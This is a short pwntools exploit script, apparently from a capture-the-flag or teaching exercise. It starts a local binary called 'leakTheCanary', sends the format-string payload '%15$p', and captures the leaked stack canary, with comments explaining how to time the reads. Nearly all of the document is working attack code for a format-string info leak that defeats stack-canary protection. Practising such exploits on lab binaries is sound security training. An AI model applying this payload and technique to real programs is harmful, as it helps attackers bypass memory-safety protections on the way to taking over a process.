from pwn import *

elf = ELF("./leakTheCanary")
if args.GDB:
    p = process(elf.path)
    g = gdb.attach(p)
else:
    p = process(elf.path)

p.recvuntil(b"data:\n") #Since its a puts output there is automatic newline
                        #You can figure out if there is a space between 'data: \n' or not 'data:\n'
                        #By marking it using your mouse and seeing when the entire line is marked.
                        #This is important because otherwise recvuntil() will loop forever.
p.send(b"%15$p")
p.recvuntil(b"entered:\n")
leakedCanary = p.recv().strip() #b"canary_value" is what will be stored
#print("Leaked canary value: " + str(leakedCanary)) #Can also work if you want it printed

log.success("Leaked Canary: " + leakedCanary.decode('utf-8'))


